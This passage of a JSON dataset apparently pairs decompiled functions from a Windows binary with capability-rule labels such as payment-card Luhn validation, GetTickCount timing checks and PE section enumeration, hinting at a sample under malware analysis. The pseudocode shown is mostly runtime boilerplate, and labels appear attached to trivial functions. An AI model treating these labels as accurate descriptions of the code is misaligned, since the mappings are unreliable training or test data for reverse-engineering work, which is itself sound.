            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004033d0(void)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402a10();\n    var_ch = fcn.004012e0(uVar1);\n    var_8h = 8;\n    piVar2 = fcn.00402ce0(&var_ch, &var_8h);\n    var_10h = *piVar2;\n    var_14h = var_10h + -1;\n    var_18h = fcn.004012e0();\n    puVar3 = fcn.004036a0(&var_18h, &var_14h);\n    return *puVar3;\n}\n",
        "token_count": 209
    },
    "00403430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403430(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00403330();\n    fcn.00403330();\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 0x18) = 0;\n    return param_1;\n}\n",
        "token_count": 81
    },
    "004034a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004034a0(uint arg_8h)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_10h = fcn.004034d0();\n    fcn.004035e0(arg_8h, *(in_ECX + 0x18), arg_10h);\n    return;\n}\n",
        "token_count": 87
    },
    "00403650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403650(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_4h;\n    \n    uVar1 = fcn.00402ec0(arg_8h);\n    uVar1 = fcn.00402ec0(uVar1);\n    fcn.00401050(8, uVar1);\n    puVar2 = fcn.00402ec0(arg_ch);\n    fcn.00401420(*puVar2);\n    return;\n}\n",
        "token_count": 120
    },
    "004036d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004036d0(uint noname_0, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00402ec0(arg_ch);\n    fcn.00403430();\n    return in_ECX;\n}\n",
        "token_count": 62
    },
    "00403700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403700(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00403a40(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 41
    },
    "00403720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403720(uchar *arg_8h, uchar *arg_ch)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh;\n    uint var_eh;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x41271d;\n    unique0x00005080 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_eh + 2;\n    var_24h = fcn.00402a10();\n    fcn.00403040(var_24h);\n    var_30h = &var_eh;\n    fcn.004032c0(var_30h, var_18h);\n    var_4h = 0;\n    *(var_18h + 0x14) = 0;\n    *(var_18h + 0x18) = 0xf;\n    arg_8h_00 = fcn.00403b10(arg_8h, arg_ch);\n    var_20h = fcn.00402ec0(arg_8h_00);\n    uVar1 = fcn.004034d0();\n    if (uVar1 < var_20h) {\n        fcn.00401710();\n    }\n    var_fh = 0xf < var_20h;\n    var_eh._1_1_ = var_fh;\n    if (var_fh) {\n        var_28h = fcn.004034a0(var_20h);\n        var_34h = fcn.00403530(var_28h + 1);\n        fcn.00403910(var_18h + 4, &var_34h);\n        *(var_18h + 0x18) = var_28h;\n    }\n    var_2ch = var_1ch;\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 2) {\n        iVar2 = fcn.00402c50();\n        var_10h = *arg_8h;\n        fcn.00402e70(iVar2 + *(var_18h + 0x14), &var_10h);\n        *(var_18h + 0x14) = *(var_18h + 0x14) + 1;\n    }\n    iVar2 = fcn.00402c50();\n    var_11h = 0;\n    fcn.00402e70(iVar2 + *(var_18h + 0x14), &var_11h);\n    var_2ch = 0;\n    fcn.004016f0();\n    fcn.00403a20();\n    var_4h = 0xffffffff;\n    fcn.00403290();\n    *in_FS_OFFSET = stack0xfffffff0;\n    return;\n}\n",
        "token_count": 745
    },
    "004038d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004038d0(uint arg_8h, uint arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4126b0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00403a00(arg_8h, arg_ch, 1);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 120
    },
    "00403910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403910(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    uVar1 = fcn.00402ec0(arg_8h);\n    uVar1 = fcn.00402ec0(uVar1);\n    puVar2 = fcn.00401050(4, uVar1);\n    puVar3 = fcn.00402ec0(arg_ch);\n    *puVar2 = *puVar3;\n    return;\n}\n",
        "token_count": 130
    },
    "00403c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c10(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint arg_10h;\n    uint *arg_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_14h = &arg_ch;\n    arg_10h = 0;\n    uVar1 = fcn.00405c40(1);\n    uVar1 = fcn.00403be0(uVar1, arg_8h, arg_10h, arg_14h);\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "00403f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403f70(uint arg_8h)\n\n{\n    fcn.004048e0(arg_8h);\n    return;\n}\n",
        "token_count": 35
    },
    "00404340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404340(void)\n\n{\n    uint arg_8h;\n    \n    arg_8h = fcn.00404a20();\n    fcn.0040a810(arg_8h);\n    return;\n}\n",
        "token_count": 50
    },
    "004043b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004043b0(void)\n\n{\n    fcn.0040a660(1);\n    return;\n}\n",
        "token_count": 27
    },
    "00404db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404dbf)\n// WARNING: Removing unreachable block (ram,0x00404dc0)\n// WARNING: Removing unreachable block (ram,0x00404dc6)\n// WARNING: Removing unreachable block (ram,0x00404dd0)\n// WARNING: Removing unreachable block (ram,0x00404ddb)\n\nvoid fcn.00404db0(void)\n\n{\n    return;\n}\n",
        "token_count": 95
    },
    "004052d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004052d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.msvcrt.dll__except_handler4_common)(0x41900c, fcn.00405180, arg_8h, arg_ch, arg_10h, arg_14h);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 179
    },
    "00405330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405330(uint ptr)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00405330::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    sub.msvcrt.dll_free(ptr);\n    uStack8 = 0x40536c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 147
    },
    "004053b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004053b0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004053b0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.004054c0();\n    uStack8 = 0x4053e8;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 147
    },
    "004053f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004053f0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004053f0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00405480();\n    uStack8 = 0x405428;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 144
    },
    "004054c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004054c0(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d1h;\n    uint var_18h;\n    uint *var_8h;\n    \n    puVar2 = &fcn.004054c0::var_18h;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = param_1;\n    fcn.00405330(*param_1);\n    *var_8h = 0;\n    var_8h = 0x40550a;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 182
    },
    "00405670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405670(uint *ptr)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    if (*(ptr + 1) != '\\0') {\n        sub.msvcrt.dll_free(*ptr);\n    }\n    *(ptr + 1) = 0;\n    *ptr = 0;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 148
    },
    "004057a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004057a0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004057a0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = fcn.004056d0();\n    uStack8 = 0x4057db;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 151
    },
    "004057e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004057e0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.004057e0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = fcn.004056d0();\n    uStack8 = 0x40581b;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 151
    },
    "00405b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00405b30(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00405a50(0, 0, 0, 0, 0);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 125
    },
    "00405b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405b70(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = &stack0xfffffffc;\n    for (iVar3 = 0; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0x17);\n    iVar3 = fcn.004114b0();\n    if (iVar3 != 0) {\n        pcVar1 = swi(0x29);\n        (*pcVar1)();\n    }\n    fcn.00405850(2, 0xc0000417, 1);\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000417);\n    uVar2 = fcn.004114b0();\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 254
    },
    "00405bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405bf0(uint32_t arg_8h)\n\n{\n    uint32_t var_c4h;\n    \n    if ((arg_8h < _sym.imp.msvcrt.dll__iob) || (_sym.imp.msvcrt.dll__iob + 0x260 < arg_8h)) {\n        var_c4h = 0;\n    }\n    else {\n        var_c4h = 1;\n    }\n    return arg_8h & 0xffffff00 | var_c4h;\n}\n",
        "token_count": 117
    },
    "00405c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c60(int32_t lpCriticalSection)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    puVar3 = &stack0xfffffffc;\n    for (iVar2 = 0; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.00405bf0(lpCriticalSection);\n    if (cVar1 == '\\0') {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n        fcn.004114b0();\n    }\n    else {\n        (*_sym.imp.msvcrt.dll__lock)((lpCriticalSection - _sym.imp.msvcrt.dll__iob >> 5) + 0x10);\n        fcn.004114b0();\n    }\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 220
    },
    "00405ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ce0(int32_t lpCriticalSection)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    puVar3 = &stack0xfffffffc;\n    for (iVar2 = 0; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.00405bf0(lpCriticalSection);\n    if (cVar1 == '\\0') {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n        fcn.004114b0();\n    }\n    else {\n        (*_sym.imp.msvcrt.dll__unlock)((lpCriticalSection - _sym.imp.msvcrt.dll__iob >> 5) + 0x10);\n        fcn.004114b0();\n    }\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 221
    },
    "00405d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405d60(uint arg_8h, uint *arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    int32_t var_8h;\n    \n    puVar2 = &var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00406de0(arg_8h, *arg_ch, arg_ch[1], *arg_10h, *arg_14h, *arg_18h);\n    *(var_8h + 0x450) = 0;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 202
    },
    "00405dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405dd0(uint ptr)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00405dd0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    sub.msvcrt.dll_free(ptr, 2);\n    uStack8 = 0x405e0e;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 153
    },
    "00405e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e20(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t noname_0;\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_30h;\n    uint var_2ch;\n    uint var_20h;\n    int32_t var_10h;\n    code *pcStack16;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xfffffffe;\n    var_8h = 0x417878;\n    pcStack16 = fcn.004052d0;\n    var_10h = *in_FS_OFFSET;\n    puVar2 = &fcn.00405e20::var_30h;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = var_8h ^ *0x41900c;\n    noname_0 = *0x41900c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.00405e20::var_10h;\n    var_2ch = 0;\n    fcn.004074b0();\n    var_4h = 0;\n    var_2ch = fcn.00407350();\n    var_4h = 0xfffffffe;\n    fcn.00405e96(noname_0, unaff_EDI, unaff_ESI);\n    fcn.00411450(var_2ch, extraout_EDX);\n    *in_FS_OFFSET = var_10h;\n    var_4h = 0x405ece;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 428
    },
    "00405ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ef0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_ech;\n    uint var_e0h;\n    uint var_d1h;\n    uint var_38h;\n    uint uStack28;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x412730;\n    var_ch = *in_FS_OFFSET;\n    puVar2 = &fcn.00405ef0::var_38h;\n    for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    *in_FS_OFFSET = &fcn.00405ef0::var_ch;\n    fcn.00406c90(&fcn.00405ef0::arg_8h);\n    arg_8h_00 = fcn.00406c90(&fcn.00405ef0::arg_8h);\n    fcn.00405e20(arg_8h_00, arg_ch);\n    *in_FS_OFFSET = var_ch;\n    uStack28 = 0x405f8c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 339
    },
    "004061b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004061b0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.004061b0::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.004053f0();\n    if (cVar1 != '\\0') {\n        fcn.00405460();\n    }\n    uStack8 = 0x406208;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 176
    },
    "00406360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406360(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406360::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.00406840(in_ECX + 0x14);\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    uStack8 = 0x4063ad;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 208
    },
    "004063c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063c0(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.004063c0::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = fcn.00406840(in_ECX + 0x14);\n    *arg_8h = uVar1 & 0xff;\n    arg_8h[1] = 0;\n    uStack8 = 0x40640d;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 209
    },
    "00406420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406420(int32_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406420::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    iVar1 = fcn.00406870(in_ECX + 0x14);\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    uStack8 = 0x40646b;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 206
    },
    "00406480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406480(uchar *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406480::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = fcn.00406870(in_ECX + 0x14);\n    *arg_8h = uVar1;\n    uStack8 = 0x4064c6;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 189
    },
    "004064d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004064d0(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.004064d0::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = fcn.00406870(in_ECX + 0x14);\n    *arg_8h = uVar1 & 0xffff;\n    arg_8h[1] = 0;\n    uStack8 = 0x40651d;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 209
    },
    "00406530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406530(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00406530::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    iVar1 = fcn.004068a0(in_ECX + 0x14);\n    *arg_8h = iVar1;\n    arg_8h[1] = iVar1 >> 0x1f;\n    uStack8 = 0x40657a;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 200
    },
    "00406580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406580(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00406580::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    uVar1 = fcn.004068a0(in_ECX + 0x14);\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    uStack8 = 0x4065cb;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 200
    },
    "004065e0": {
        "rules": [
